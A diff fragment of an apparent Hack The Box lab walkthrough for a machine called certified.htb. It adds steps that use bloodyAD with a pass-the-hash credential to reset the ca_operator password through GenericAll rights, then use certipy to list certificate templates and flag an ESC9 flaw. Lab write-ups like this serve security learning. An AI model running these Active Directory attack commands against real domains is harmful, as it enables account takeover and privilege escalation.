@@ -64,7 +64,16 @@
 
 10. Bloodhound shows management_svc has GenericAll privs on user ca_operator. Change ca_operator password
 	```python3 /opt/bloodyAD/bloodyAD.py --dc-ip 10.129.131.108 -d certified.htb -u management_svc -p :a091c1832bcdd4677c28b5a6a1295584 set password ca_operator P@ssw0rd```
+Success!
 
+![image](https://github.com/user-attachments/assets/23415309-3f97-4fd2-9e6e-31b3feae8432)
+
+11. Get list of certificate templates
+	```certipy find -u ca_operator -p P@ssw0rd -dc-ip 10.129.131.108 -enabled```
+
+![image](https://github.com/user-attachments/assets/2a9d2c0d-966e-4345-be32-68f88bfe1f85)
+
+12. CertifiedAuthentication template has ESC9 vulnerability. 
 
 
 
